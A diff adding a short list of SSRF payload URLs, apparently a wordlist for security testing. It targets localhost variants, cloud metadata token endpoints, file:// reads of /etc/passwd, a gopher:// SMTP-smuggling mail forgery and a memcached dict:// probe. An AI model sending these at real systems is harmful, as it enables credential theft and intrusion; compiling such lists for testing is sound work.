@@ -1,0 +1,11 @@
+http://127.0.0.1:80
+http://localhost:22
+http://[::]:80/
+http://0000::1:80/
+http://0177.0.0.1
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
+file:///etc/passwd
+file://C:/Windows/win.ini
+gopher://127.0.0.1:25/_MAIL%20FROM%3A%3Cattacker%40attacker.com%3E%0ARCPT%20TO%3A%3Cvictim%40victim.com%3E%0ADATA%0ASubject%3A%20Hello%0A%0AHello%20via%20SSRF%0A.
+dict://127.0.0.1:11211/stats
